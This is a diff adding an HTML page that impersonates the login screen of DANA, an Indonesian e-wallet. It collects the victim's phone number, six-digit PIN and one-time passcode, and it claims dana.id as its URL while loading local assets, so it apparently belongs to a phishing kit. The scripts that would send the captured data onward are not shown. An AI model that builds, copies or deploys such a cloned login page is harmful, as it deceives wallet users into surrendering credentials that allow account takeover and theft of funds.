@@ -1,0 +1,120 @@
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>DANA - Apa pun transaksinya selalu ada DANA</title>
+  <meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
+  <meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&amp;usqp=CAU">
+  <meta property="twitter:image:src" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&amp;usqp=CAU">
+  <meta property="og:url" content="https://dana.id">
+  <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+  <meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+  <link rel="stylesheet" href="ast/8d62ea654fcf0e4cae001e344ee2592c.css">
+  <link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css">
+  <link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css">
+  <link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css">
+  <link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">
+ </head>
+ <body>
+  <div style="display:none;" class="index">
+   <div class="header">
+    <img src="ast/img/dana_logo.png" class="logo" alt="">
+   </div>
+   <div class="content">
+    <div class="hero">
+     <img src="ast/img/hero.svg" alt="">
+    </div>
+    <h1>Dompet digital untuk kamu!</h1>
+    <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+    <div class="line"></div>
+    <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
+    <button type="button" onclick="next();">LOGIN</button>
+   </div>
+  </div>
+  <div class="start" style="display:none;">
+   <img class="logo" src="ast/img/dana_text.png">
+   <div class="footimg">
+    <img src="ast/img/bi.png" alt="">
+    <img src="ast/img/kom.png" alt="">
+    <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+   </div>
+  </div>
+  <div class="container hid">
+   <div class="box-login">
+    <div id="process" name="process" class="process" style="display: none;">
+     <div class="loading">
+      <img src="ast/img/load_bg.png">
+      <img class="spinner" src="ast/img/load_spin.png">
+     </div>
+    </div>
+    <div class="header">
+     <img src="ast/img/dana_logo.png" class="logo" alt="">
+    </div>
+    <form id="formNohp" onsubmit="sendNohp(event);">
+     <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+     <div class="box-input">
+      <div class="label">
+       <img src="ast/img/indo.png" alt="">
+       <label>+62</label>
+      </div>
+      <input id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="811-1234-5678" maxlength="15">
+     </div>
+     <p class="desc">Nomor ponsel akan digunakan sebagai ID kamu &amp;<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <b>Syarat &amp; Ketentuan</b> dan<br><b>Kebijakan Privasi</b> kami</p>
+     <div class="box-btn">
+      <button disabled id="btn" class="btnnohp" type="submit">LANJUT</button>
+     </div>
+    </form>
+    <form id="formPin" class="hid">
+     <h3>Masukkan <b>PIN DANA</b></h3>
+     <div class="box-input-pin">
+      <div type="button" class="clear"></div>
+      <input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      <input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      <input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      <input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      <input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      <input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+     </div>
+     <button class="show" type="button">TAMPILKAN</button>
+     <p class="forgot">LUPA PIN?</p>
+    </form>
+    <div class="bgotp hid">
+     <form id="formOtp" class="">
+      <h2>Masukkan OTP</h2>
+      <p class="alert">Kode OTP telah dikirim ke nomor Anda</p>
+      <div class="box-input-otp">
+       <div class="loadingOtp" style="display:none;">
+        <img src="ast/img/load_bg.png">
+        <img class="spinner" src="ast/img/load_spin.png">
+       </div>
+       <div type="button" class="clearotp"></div>
+       <input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+       <input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+       <input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+       <input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;">
+      </div>
+      <p class="resend">KIRIM ULANG (<span id="countdown">120</span>s)</p>
+     </form>
+    </div>
+   </div>
+  </div> 
+  <script>window.onload = function()
+{
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container").fadeIn(200);
+                   $("#inp").focus();
+                },1000);
+            },2000);
+        },500);
+}
+</script> 
+ </body>
+    </html
